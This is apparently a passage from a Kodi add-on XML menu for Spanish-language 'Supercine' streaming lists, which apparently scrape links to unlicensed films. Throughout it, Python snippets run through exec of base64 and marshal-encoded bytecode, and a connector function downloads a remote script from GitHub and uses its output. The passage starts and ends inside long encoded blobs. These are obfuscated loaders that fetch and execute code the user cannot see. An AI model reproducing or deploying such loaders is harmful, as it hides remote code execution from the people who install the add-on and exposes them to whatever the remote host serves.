bE9iVmt6VFZSWk5FNVVTVEpOZW1ONFRtcFJNMDVFVW10TmVrMHhUVVJqTlU1cVl6Sk9lbGw1VG1wWk1VNXFZM2xOZWsxNlRXcFpNVTU2VVRCYWFrMHdUbXBuTTFsVVZUQk9iVTE2VDFSWmVFNXFhekpQUkZFeFRXMUplazVxVlRKT1ZFVXhXVlJhYkUxNlJURk9lbGw1VFhwWmVWcHFXVFJOYlVreFRtcGpNVTVxV1hwTlZHTjZUbnBaTVU5RVdtMU9la1V5V2tSa2FFNUhUVEJQVkUxNVRucFZNMDVVV1RGTmVrbHowUXdBQURGQmQwZ3pRVWRNTTFwSFJEUkJkMHd3VEVkTU1scHRVakpNZDB3d1FYZFdNa0pIU1hWQmJWSXpRVWRGZWtGNlRHMUNSMHcwUVVkME0wSlJXakpCYlV4dFFsRkVOVUZSY0RKTlVYQnFXbTE0TTBKUlREVkJSM2d4UVhkTmVGcDZUREZCUjBWNlducFdiVUZ0VEd4YWJYUXlRVkZJYlVGUlREQk5SM0EwV20xV2JVRlJTRE5CUjNReFdtMWFiRUY2UkRKQmQwUXpRWGRJTWxwSFRHeEJiWGhzVFhkTmVWcHRTREpNYlVneldtMU1NVUpIV2pKYWJWb3lXbTFGZGxwNlRERkJVVm95UVhkYWJWcFJTR3RCZDBSdFFYZElNMEZVVWpOYVIxbzBRVWQ0TWtGUmNEQmFiWEF4UVVkRmRVRkhkREJCYlV4clFWUldiVUpSU0cxQmJVUXpRVWRhTTFwdGVETkJiVWcwUVcxTU0xcDNSR3RCZDNneVRHMXhkVUZIU0ROQ1VWcHRRVlJXYlZwdFRHMUJNbEl4UVVkd00wRlJUREpNYlV3MFFYZDRNRUpSUkRWYWJWSXdUVWR3TTBGdFZtMUJkM0F5UVcxV00wRkhjWFZCYlVneldsRkliVnB0Y0cxQlVYQnJRWGRTTTFwdFYzcEJTbEl5VFZGRmVscHRUakJhUjFwclFXMUliVUpIY0RGQk1sSnRRVWRNTVZkcU1GaHVNa2sxYjBwVFpVMUxWblJEUms1aFJFbDFhRUZKVTBWTWVqRnNURXBhYTB4dFFYbEZWRWxwY2tkSmFuQktUVEpKU0d0NlIxVlBhMFo0TVVkWk1XTkVRbEp4V1VodFVtcE5TM1ZYVEVZNWQzSmhVMnRZTURGNmNFcFdhbkY2VTNkTWVsTTBRa2RJTW01NVR6TklTVVZsY25wSldFRktVMnRCYkdkclJFdEJWM0YzY0dsRk1rRjZiMFk1Ym5CSGVXbHhWSGwxUmt0TmRtNTVRVzFOVlhWbmJrbE5la2wzVDJkR1MwUXdXakJJTUV4NGNWQndTbE5uV2twRmJsb3hRWFpCVURrMVJYbFhhVTB6VFhkdlVEa3hibmR4Tm05SFFXRkplakZJUmtkUGVrRnRjV2hhWVZkUWNIZE5aRVF6UVhsdmVqbEJRVkZ4VFZwaFdtVndTa1Y1YnpOSlVFWjRWakpCVlVsSWIwWm5iWEZTWjBWTWJVVm1ibFJOUjBSNE5WQkhVWGxyVEVsQllrRkhUbVZJU2xkYVIxTk5aRzkzZVVoWWJYbHNjSGw1UjBGNk1ERkZiWEY1U1dGMGJWa3dZMVpIZDAxaFNFaG5RVnA1WTJoTVlVNXNURzFOUlVVeU1UWkZVVmQ0YjFWaWJHOUlaelZOU0RWNFRUQlRXa3BKZUcxdk0yTnNja2xCWlUxNE1WQmFlRTExUmtkTlNXNUxjV2hKU2xOSFRYWTVZa0pUUlZGRU1FbHJSekpKTUVsaGRVRndNamxXYnpKamRYQmhTVkpHTURGbFNYcDVVbTlMZVVad00wVnRSSGhYWkZnd1owaEpTRUZWVFd4blJrMHpZakZNZUZZMFNETlhhVXA1V214dk1sTmxXVzExTmtsM1YzcHVSMGhzY0VoVFpIRjRhMVJOZWpGNlFYZFhWVTE1ZVZodVUyTjNiMUpKUVVVeVNUTnVTazFSUkhkQlZVRkllR3hLUzBRMVFUSkpWRVI0Wm1WRWVtbzFjbmRPYkhCS2EyMXlkbVpxUVRKRU1VWkpWbVZGVUdkbFJIcGpVVnBUU1daYWVHdHBjRk5GWWtWS1ptbEVNWFZJU2twWFUxcDVRWGx4Um1kalRWQm5SVWxRWjB4YVVHZHJUVkZ4TUZwdFUydHdVbWQ0YmpOeFdFVXdjVXRNU0hremJ6TkJRVTE0WjBsQ1NuRjJiMUZXYkhFd1oyaEpTVVJ0UmtsWFNsb3hSVU5aYlhsaFRHRkJSVUpJTlZGQllWTmpjVE4xWlc1VWFtbHhNMEZJUjBwWGRVY3llWGhFWVdOVFNUTjRiSEJ0VTJoR2VtdHJjRWhUWWtoNlkxTklla3hwVFhveE1rVlJkVmx3ZVVFMFdXMVdORnA2VTA5SWQzRnJibUZUVlVSS2NXTklNWEZwY0hwME1HOUlWMjVNU0RsSWJsQm1NVXA2YTJWRVlYRXhXakZqU0VGSFUwZEZkM1JsUjBsRldrRnRUVnB4ZWtsblFVZFBaRWRLY1VadVlVVTJRV0ZhTTI1VWVWaEpVbGRwY0cxSlkwZHRRV0p3ZWpWcGNGTjFZVXA2V2pWd1VVbG9ia2xGVTI5aFZ6WnZTMDF1Y0RCWGRWcDNjV1ZHU1ZOcVdub3hWVXhLZVVKYVNFMTNSRE5QU1V4S1ZqQkJTMWMxY0VZNGFVVjRTV2hhU2tWVFJrZEJSRTB4U1dORlIxZHFiekF4V1VSNGRYaHdWVTB5YjBwamFVWkhRV1JFTWxkUVdERlBSRXBIVTJwRVNGYzJTbFJGTlVWS2RWbEZlSEZpV0ROamFrcDNUVTlOTUUwemIxSXhSMFI2WXpWRmQzVm1XbFZTYWtkSVkwbENTa2w1YjB0VE5rRjVUREpOTUhremJubFNORzlMUVU5SlVqbEpTVXRhYkUxUmRXVnZlbmswUWtkWGRscElOREJIU25sNWIxTkZiVVpMUlRWQlVWb3liM28wTVVaNWRVVndVa3d6UlhoMVlYSkxVMHR1UzFOdVFYWTVNa3BSUVdaWk1FRmhiMGRCV0c5NFFUWkplRUZ0V2tsTmJGcFNhakZ3UzNVMFNWUmlOWEZTWjA5SWJVd3lXbXhuYlVVd2RXcE5WWFEwY0hoeFZGa3hUV2R5ZDBsWGNUTlBhRVpzT0dsdWJVRjRSR0ZQVlc1SlNXSkliVWxpYjNsNGJVRklSV1p3UjBsMWNrdHdhVzh3Y0dsSk1qUXdSa3RQTTFveFNXeEhiRGxpY0VsQlUyOVJRWHB2ZW5neFJqSlROa1ZWVTJOR01rMWlibnByVDBFeFJVeENSbVpyV2tsSlVYQlZValJaTW5GRFNXeG5WRWxLTVZGQmQzRnRiMHBJTTBGdFNXeEllbE4xV2pCeFZsZ3dORFJ2TUdJMVRWUjVWRzV0VHpaYWVrZzBUVEkxYkc5R09UWkpSamxLUVZGVFRVbEhSVlZaTWxabFNVdFhRWEoyWmpWYWVqVnBURWROV1VkVU5XcE5SamswUkRKMVpVSkdaMWxaYlhGU1RYZ3hWMWh0ZFcxQ1NHdDVXVzFCVWsxVU9HbFpiVk5hUWtoTWFYRjRVMUJ4YkRsWlJYcG5kWEpLTlVWQk0xTnJia2hJTWtFeU5XMUVlbXRzV0cxSVpVMUlWMGR2VTFJMFJqRlBWMXBzT1haSk1VVnVUVEJxYVUxdFFXTlpiVWcxV1RCbmVrMTNUbVZDUzNGNGNFbGpNMDB5VWpCeVMxTlRjVVk0YkVneFUxVllNbE5uYjB0YWFVVmhjWFp3ZW1Oc1JIaG5kVzVKZURGTU1qVlBja2RFYTBFeVFVMXhla0Z0U1ZGV01FUXpZMkp3TUZOclJIcEpObkV5U0dWQlNuUnBUSHBJTWtoMlpqSmFiVUUxY0ZWWGFrUmhWak5ZTVVsS1JFbEpTWEpWY0ROWU1VRmhiekpYVEhKMk9YZEtVMDFFV1cxT01rcEthalZGYkdkdVFYZEJUVVF3ZUdsd1NFZ3pXVEZGZFVReFNXbHZiWEV6YnpKQlkwUmhlWFpHTW5saFFrWm5SM0J0VjJKWk1WSnFibnAxYkUxM2VEUkpTR2RxUmtoQlpWb3dTV2R1U1VWRlduWm5UVzk2ZVcxQ1UzVlVURzFNYVc1SVRETklSMDlaYm5wSVpWa3pTVmhaTUZkdFFXRmpkVmx0Y0ROTWVVODJjRE5hYVVGdFQyZHZSbWRZUVhkRWFYSkljRE5FTVVsdWNVcEpUVWRMVDJ4Wk1ubGpia294U0c1UlFWbHhTbU5CUldGalpFWkdaMlZDVlZOVmJrcE5UMFV4ZEdWeFVtcHBTa2RTYVV4SFdqVkJTa2xQU0hoamJXOUhXakpHTTA5NlRFZDViVnA1VFRCTmVIQnBia2RYTTFvelUwbHhVVUZzYmtsSllraDRRVmRFYlhBelJYbEphMjVHWjJseVMwZzBXVEJOUWxwNWRUSmFZWEZSUWt0QlNFeEtabWxDUm1acFRUTkJNVzloUVdsYVNFMVJRbE5TWlUweFkxRlpNR296YmtoWGVXNXRkR2x1U2xOMVJqSXdNMWx0ZVdkd2JVMXJURW93TWt4SGRHVlpNMEZGUVZKWFpXNTVlV05aTTBSc1JqQTFkM0ZIV21GUlJHTTJia281YUZaUk1IUlhNV3MwUVcxWGNISlJUWHBMVlhRelFWTnJORnB0VTNCeVVWcHRWMm93V0c5NlNXbFdVVEIwVFV0TmRXOVFkR0ZMVlhReVdubHJORUYzZVhCeVVVMTVTMVYwTWxwSmF6UkJiVUZ3Y2xGTWJVdFZkREpDU1dzMFFYZDVjSEpSVjNsTFZYUXpRVWxyTkVGNlNYQnlVVXcwUzFWME1rRkphelJCYlhWd2NsRk5kMHRWZERKQ1NXczBRWGROY0hKUmNEVkxWWFJzUWxOck5FRjZSWEJ5VVUxNlMxVjBNMXA1YXpSQmJVOXdjbEZNTkV0VmRESkJTV3MwUVcxSmNISlJjRzFMVlhSc1FrbHJORnAzVG1GWVJrNWxWbFJKTWt4S2FtSlhNV3MwUVhkQmNISlJUWHBMVlhReVFWTnJORUYzU1hCeVVVeHRTMVYwTTFveGF6UmFla2x3Y2xGTU1FdFZkREpCU1dzMFFYZEJjSEpSVFhwTFZYUXlRVk5yTkVGM1NYQnlVVlkwUzFWME0wRlRhelJCYlZkd2NsRk1OVXRWZERKTlNXczBRWGQ1Y0hKUmNEQkxWWFF6UWtsck5GcDZRWEJ5VVZacVMxVjBNMHhKYXpSQmQzbHdjbEZOZWt0VmRESk5TV3MwV25kNFlWaEdUbVZXVkVreVRFcHFZbGN4YXpSQmQxZHdjbEZNTlV0VmRESk5TV3MwUVhkVGNISlJjRzFMVlhReVdqRnJORUYzZVhCeVVVdzFTMVYwYkUxSmF6UkJiVWx3Y2xGTmVVdFZkREpDVTJzMFFYZEpjSEpSY0RSTFZYUXlUREZyTkVGM2VYQnlVVXd5UzFWME0wSkphelJhZDNWd2NsRk5la3RWZEROYWVXczBRWGRUY0hKUlRHMUxWWFF5VERGck5FRjNTWEJ5VVZZMVYyeDRkRmhzVDNseGVsTm1XRkJ4Y0hKUlRHMUxWWFF5VFhsck5FRjNSWEJ5VVV3eFMxVjBNbG94YXpSQmJVRndjbEZYZVV0VmRESkJVMnMwUVhkSmNISlJURzFMVlhReVRYbHJORUYzUlhCeVVVd3hTMVYwYkVKVGF6UkJlbGR3Y2xGTU1VdFZkRE5DU1dzMFFYcEZjSEpSVEd0TFZYUXlUSGxyTkVGM1NYQnlVWEJzUzFWMGJGcFRhelJhZWtGd2NsRldha3RWZEROTVNXczBRWGQ1Y0hKUlRYcExWWFF5VFVsck5GcDNlR0ZZUkRCWVRVdE5kVzlRZFhkdk1qRnFia3ByZVZoVlkyWnVTbFpvVFZSSmQyOHlNV3B3ZWtsdGNHeDFka3hMUVhsQmQwUm9USGRNTUUxVVNYZHZNa1Y1V0ZSSk1reEthbUpYTVdzMFFYcEpjSEpSVERGTFZYUXlUWFp3WTFoR2VHWlhiV3R0Y1ZWWFkyOTZjQ3RYYkdwaFRVdDFlVXhzY0dOWVJEMDlkQVVBQUFCeWIzUXhNM01KQUFBQWJXOXljR2hsZFhNZ2N4d0FBQUJqYjJSbFkzTXVaR1ZqYjJSbEtIUnlhVzVwZEhrc0lIcHBiMjRwZEFZQUFBQnZjbUZqYkdWekhnQUFBR052WkdWamN5NWtaV052WkdVb2EyVjViV0ZyWlhJZ0xDQjZhVzl1S1hRREFBQUFibVZ2Y3dnQUFBQThjM1J5YVc1blBuUUVBQUFBWlhobFl5Z0xBQUFBZEFZQUFBQmlZWE5sTmpSMEJnQUFBR052WkdWamMzUUlBQUFBYlc5eWNHaGxkWE4wQndBQUFIUnlhVzVwZEhsU0JBQUFBSFFJQUFBQWEyVjViV0ZyWlhKMEJBQUFBSHBwYjI1MEJBQUFBR1YyWVd4U0JRQUFBSFFIQUFBQVkyOXRjR2xzWlhRSkFBQUFZalkwWkdWamIyUmxLQUFBQUFBb0FBQUFBQ2dBQUFBQWN3WUFBQUJ6WTNKcGNIUjBDQUFBQUR4dGIyUjFiR1UrQVFBQUFITU9BQUFBR0FFR0FRWUJCZ0VHQVFZQktnRT0iKSkp"))
]]></expres>
<page></page>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist.param2]'
titulo = '[makelist.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/dRGJYb3.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>
-------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Webs[/COLOR]</title> 
<link>http://ignorame</link>
<externallink>http://bit.ly/menu_webs_cine</externallink>
<thumbnail>https://i.imgur.com/WyF0ICR.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>
---------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Mundocine [COLOR gold][/COLOR]</title>
<link>http://ignorame</link>
<externallink>http://bit.ly/MundocineCristalAzul</externallink>
<thumbnail>https://i.imgur.com/Aqw5b2R.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>
------------------------------------------------------------------------------------------------------------------------------------------------
<!--
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Clásico [COLOR gold] [COLOR green][/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/GcJOuJi.png</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
<externallink>https://pastebin.com/raw/2L8wuaw5</externallink>
</item>
-->
------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Clásico [COLOR gold] [COLOR green][/COLOR]</title>
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,xbmc,xbmcaddon,xbmcgui,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>multi</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
title = '[c.param1]'
import xbmc,xbmcaddon,xbmcgui,re,json
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[multi]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]
]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/2vFkANy.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>
---------------------------------------------------------------------------------------------------------------------------------------------------------

<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Actor/Actriz/Director [COLOR gold][COLOR green][/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/tCfUUvL.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
<externallink>http://bit.ly/spercineactores$$LSProEncKey= $$</externallink>
</item>

-----------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]sagas[/COLOR]</title>
<link>$doregex[makelist]</link>
<regex>
<name>makelist</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist.param1][/COLOR]</title>
<link>$doregex[makelist2]</link>
<thumbnail>[makelist.param3]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
from datetime import datetime, timedelta
import re,requests,urllib2,xbmc,time
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist.param2]'
titulo = '[makelist.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MEh4a0FBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGTmVrVXpUbFJWZDA1dFdYcE5SR040VFhwSmVrNVVXbXhPZWxFd1dYcEtiVTVVU1hsWmFrMTVUbXBSTUUxcVRURk5la2t6VGtSTmQwMTZWVE5OYW1NMFRrZFJNVTU2WXpGT1ZGVjZUbFJaZUU1dFVURk5hazAwVGtSck1FNXFXVFJPZWswd1RYcFJNVTV0VlRKT1JHUm9UbnBOTUUxcVZYZE9WR013V1hwVk1FNVVVVEphUkZrd1RrUkpNbHBxVlhkT1JFa3lXbFJWTVUxNlVUQk9SR015VFcxWmVrNVVUVFJPVkdkNlRsUlJlVTE2WTNwUFZFMTNUbFJaTUU5RVdtMU5lazB5V2tSVk5VNXFaM3BPVkZWNFRrZE5NazlVVW10T2V